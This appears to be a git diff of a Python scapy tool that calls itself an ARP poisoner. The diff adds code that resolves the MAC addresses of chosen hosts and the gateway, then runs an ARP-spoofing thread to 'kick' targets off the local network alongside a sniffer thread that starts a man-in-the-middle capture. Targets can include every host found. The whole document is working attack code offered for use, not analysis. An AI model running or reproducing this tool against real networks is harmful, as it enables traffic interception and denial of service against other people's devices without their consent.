@@ -2,16 +2,28 @@ from scapy.all import *
 import argparse
 import re
 from get_hosts import get_all_hosts
-from poisoner import kick_hosts
+from poisoner import kick_hosts, restore_hosts
 import os
+import sniffer
+import threading
 
-def get_defult_gateway():
+
+def get_defult_gateway(iface):
     packet = IP(dst="google.com", ttl=0)
-    ans = sr1(packet, verbose=False)
+    ans = sr1(packet,iface=iface, verbose=False)
     return ans.src
 
-GATEWAY = get_defult_gateway()
-IFNAME = None
+def get_mac(ip):
+    try:
+        arp_packet = ARP(pdst = ip)
+        broadcast_packet = Ether(dst ="ff:ff:ff:ff:ff:ff")
+        arp_to_broadcast = broadcast_packet / arp_packet
+        answered_list = srp(arp_to_broadcast, timeout = 5, verbose = False)[0]
+        return answered_list[0][1].hwsrc
+    except Exception:
+        return None
+
+
 
 def main():
     parser = argparse.ArgumentParser("ARP poisener")
@@ -22,15 +34,24 @@ def main():
 
     args = parser.parse_args()
 
-    global IFNAME
+    ifname = conf.iface
+    gateway = get_defult_gateway(ifname)
+    targets = []
 
     if args.iface and args.iface==1:
         print("Available interfaces:\n")
         print(get_if_list())
-        IFNAME = input("\nEnter your selected interface:\n")
-        if IFNAME not in get_if_list():
+        ifname = input("\nEnter your selected interface:\n")
+        if ifname not in get_if_list():
             print("Invalid interface")
             exit()
+
+    if args.gwy:
+        gateway_validated = re.search(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$", args.gwy)
+        if not bool(gateway_validated):
+            print("Invalid gateway IP!")
+            exit()
+        gateway = args.gwy
     
     if args.tip:
         tip_validated = re.search(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$", args.tip)
@@ -44,16 +65,20 @@ def main():
             print("You need to be root to search hosts...\nYou can run this script with the --tip parameter to set the target ip manualy ")
             exit()
         print("Serching for online hosts...\n")
-        ans = get_all_hosts(IFNAME)
+        ans = get_all_hosts(ifname)
         if not ans or len(ans) == 0:
             print("No hosts...")
             exit()
-        
+
+        for i in range(len(ans)):
+            if ans[i][0] == gateway:
+                del ans[i]
+                break
+
         print(str(len(ans)) + " hosts found:\n")
         for i, host in enumerate(ans):
             print(str(i+1) + ": " + host[0] + " " + host[1])
         
-        targets = []
         print("Which host would you like to kick? Enter their indexes (starting from 1) seperated by space. (For example: 1 3 6)\nIf you want to attack all hosts enter \"all\"")
         hosts_to_kick = input()
 
@@ -75,18 +100,25 @@ def main():
                 except Exception:
                     print("Invalid input")
                     exit()
+
+
+    targets_MAC = [get_mac(host) for host in targets]
+
+    gateway_MAC = get_mac(gateway)
+
+
+    try:
+        sniff_thread = threading.Thread(name="Sniffer", target=sniffer.StartMITM, args= (targets, targets_MAC, gateway_MAC, ifname,))
+        kick_thread = threading.Thread(name="ARP spoofer", target=kick_hosts, args=(targets, gateway, targets_MAC, gateway_MAC,))
+
+        kick_thread.start()
+        sniff_thread.start()
+        kick_thread.join()
+        exit()
     
-    global GATEWAY
-    if args.gwy:
-        gateway_validated = re.search(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$", args.gwy)
-        if not bool(gateway_validated):
-            print("Invalid gateway IP!")
-            exit()
-        GATEWAY = args.gwy
-
-
-    kick_hosts(targets, GATEWAY)
-
+    except KeyboardInterrupt:
+        restore_hosts(targets, gateway, targets_MAC, gateway_MAC)
+        exit()
 
 if __name__ == "__main__":
     main()
